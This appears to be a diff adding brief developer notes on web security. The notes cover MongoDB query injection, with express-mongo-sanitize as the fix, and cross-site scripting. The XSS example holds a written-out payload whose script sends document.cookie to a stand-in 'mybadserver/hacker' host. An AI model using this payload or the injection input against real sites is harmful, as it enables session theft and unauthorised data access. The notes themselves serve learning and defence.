@@ -1,0 +1,18 @@
+** Mongo Injection **
+- db.users.find({ username: req.body.username });
+
+if a user sets the username like this: {"gt": ""},
+db.users.find({username: {"gt": ""}}) --> Can find all users, which is not intended
+
+To resolve this basic attacks, use express-mongo-sanitize
+Doesn't include the query or params with $ or .
+
+
+** Cross Site Scripting(XSS) **
+User can inject the javascript code with input form
+Search: XSS-game
+(ex) www.yourwebsite.com?name=<script>new Image().src="mybadserver/hacker?output="+document.cookie;</script>
+
+======================================
+NODE_ENV=production node app.js
+======================================
